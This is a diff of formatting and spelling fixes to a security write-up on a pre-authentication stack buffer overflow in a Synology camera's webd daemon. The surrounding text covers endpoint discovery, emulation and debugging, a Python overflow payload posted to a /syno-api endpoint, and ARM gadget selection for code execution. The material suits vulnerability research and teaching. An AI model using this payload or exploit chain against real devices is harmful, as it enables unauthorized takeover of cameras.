@@ -234,13 +234,13 @@ both buf1 and buf2 are stack variables, the sscanf function leads to a buffer ov
 
 ## Triggering the Vulnrabillity
 
-Now, we need to find a way to trigger the vulnrabillity, in our Pre-Auth attacking surface, since we don't know the login creds.
+Now, we need to find a way to trigger the vulnrabillity in our Pre-Auth attacking surface, since we don't know the login creds.
 
-We know that the webd binary is the one responsible handeling all the web daemon in the camera. it forks itself and executes cgis, and other binaries when a request is made.
+We know that the webd binary is the one responsible handling all the web daemon in the camera. it forks itself and executes cgis, and other binaries when a request is made.
 
 Playing a bit with the website reveals that requests are made to `/syno-api/*`. grepping this string in the webd binary, reveals all the exposed endpoints:
 
-```
+```bash
 $ strings cpio_work/bin/webd | grep "/syno-api/*"
 /syno-api
 /syno-api/security/ip_filter/deny
@@ -336,7 +336,7 @@ To debug the webd binary , we can download gdbserver from [here](https://github.
 
 Then , we can download the binary into the filesystem, and compress it back to a `player.cpio` file.
 We also need to forward another port for the gdbserver to use in the run.sh file:
-```
+```bash
 #!/bin/sh
 qemu-system-arm \
     -m 1024 \
@@ -366,7 +366,7 @@ We can test it in our machine, by running `webd & head -n1 /proc/$(pgrep webd)/m
 
 Here is the result of this command ran multiple times:
 
-```
+```bash
 > webd & head -n1 /proc/$(pgrep webd)/maps && pkill -9 webd
 ...
 00480000-0052e000 r-xp 00000000 00:02 976        /bin/webd
@@ -397,7 +397,7 @@ Reveals that the `webd` binary forks itself, and executes the `synocam_param.cgi
 
 To debug the `synocam_param.cgi` after the fork, we can run this series of commands:
 
-```
+```bash
 set follow-fork-mode parent
 catch fork
 c
@@ -467,7 +467,7 @@ Then, after that pointer there will be a pointer to the parameter of that functi
 
 Lets check that our. I sent this following json object:
 
-```
+```py
   payload = b'{"' + b"A" * 8 +  b" " + b"B" * (0x84) + b"I" * 4 + b"J" * 4 + b'": "BBBB"}'
   print(payload)
   r = requests.post(f"{HOST}/syno-api/security/info/language", headers={'Content-Type':'application/json'}, data=payload)
@@ -552,7 +552,7 @@ Then , I searched for gadgets which call this function, and found a call to it a
 The 2 least signifant bytes are both ascii, so we are good to go!
 
 We will jump a few instructions before  that, because we need to set the second parameter to "r".
-```
+```asm
 .text:00014D5C                 MOV             R2, R0
 .text:00014D60                 LDR             R3, =(aR_0 - 0x14D6C) ; "r"
 .text:00014D64                 ADD             R3, PC, R3 ; "r"
